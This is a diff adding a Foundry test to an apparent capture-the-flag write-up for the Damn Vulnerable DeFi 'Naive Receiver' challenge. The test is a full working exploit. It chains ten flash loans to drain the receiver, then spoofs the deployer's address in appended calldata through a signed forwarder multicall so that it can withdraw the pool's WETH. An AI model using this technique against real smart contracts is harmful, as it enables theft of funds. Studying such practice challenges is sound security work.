@@ -28,3 +28,43 @@ In ```NaiveReceiverPool.sol``` line-87:
 // We can make sure the last 20 bytes are any account that we wish to control.
 // That way we can impersonate accounts and perform the withdraw function on their behalf
 ```
+
+Test file:
+```
+    function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory callDatas=new bytes[](11);
+        for(uint i=0;i<10;i++){
+            callDatas[i]=abi.encodeCall(
+                NaiveReceiverPool.flashLoan,(receiver,address(weth),0,"0x"));
+            
+        }
+        callDatas[10]=abi.encodePacked(
+            abi.encodeCall(
+                NaiveReceiverPool.withdraw,
+                (WETH_IN_POOL + WETH_IN_RECEIVER,payable(recovery))
+            ),
+            bytes32(uint256(uint160(deployer))) 
+        );
+        bytes memory multicallData=abi.encodeCall(pool.multicall,callDatas);
+        BasicForwarder.Request memory request=BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            gasleft(),
+            forwarder.nonces(player),
+            multicallData,
+            1 days
+        );
+        bytes32 requestHash=keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v,bytes32 r,bytes32 s)=vm.sign(playerPk,requestHash);
+        bytes memory signature=abi.encodePacked(r,s,v);
+
+        forwarder.execute(request,signature);
+    }
+```
